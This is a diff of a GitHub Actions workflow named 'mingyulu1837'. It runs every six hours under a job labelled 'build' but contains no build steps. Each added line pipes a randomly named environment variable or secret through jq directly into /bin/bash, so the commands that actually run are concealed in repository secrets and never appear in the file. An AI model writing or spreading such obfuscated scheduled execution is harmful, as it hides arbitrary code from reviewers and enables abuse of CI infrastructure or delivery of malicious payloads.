@@ -3,30 +3,24 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
-
+    - cron: '50 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          wchkz528: ${{ secrets.wchkz528 }}
+          cfsqq1: ${{ secrets.cfsqq1 }}
         run: |
-          echo $wchkz528 | jq -r .pdv532 | /bin/bash
-          echo $d2 | jq -r .kf65984 | /bin/bash
-          echo $jyzop53 | jq -r .ieepd79 | /bin/bash
-          echo $ql04952 | jq -r .gy2389 | /bin/bash
-          echo $sduvz8 | jq -r .tx8 | /bin/bash
-          echo $hkxl3 | jq -r .kpp44755 | /bin/bash
-          echo $cdcu569 | jq -r .qip3 | /bin/bash
-          echo $hq41 | jq -r .fcf3 | /bin/bash
-          echo $fds0049 | jq -r .jw81 | /bin/bash
-          echo $dkflm89339 | jq -r .hi33681 | /bin/bash
-          echo $py007 | jq -r .glke4 | /bin/bash
-          echo $sdfo56191 | jq -r .q7 | /bin/bash
-          echo $d0 | jq -r .spe0 | /bin/bash
-          echo $t61 | jq -r .jxki79 | /bin/bash
+          echo $cfsqq1 | jq -r .dshlg28087 | /bin/bash
+          echo $rt818 | jq -r .spc77544 | /bin/bash
+          echo $ia7 | jq -r .aipoe1263 | /bin/bash
+          echo $ml04 | jq -r .ixki92867 | /bin/bash
+          echo $mj74243 | jq -r .fp767 | /bin/bash
+          echo $z261 | jq -r .r6 | /bin/bash
+          echo $qvlr7842 | jq -r .idpl83 | /bin/bash
+          echo $l30297 | jq -r .jg18330 | /bin/bash
+          echo $pv062 | jq -r .dub5631 | /bin/bash
+          echo $mhceo902 | jq -r .audv06085 | /bin/bash
 
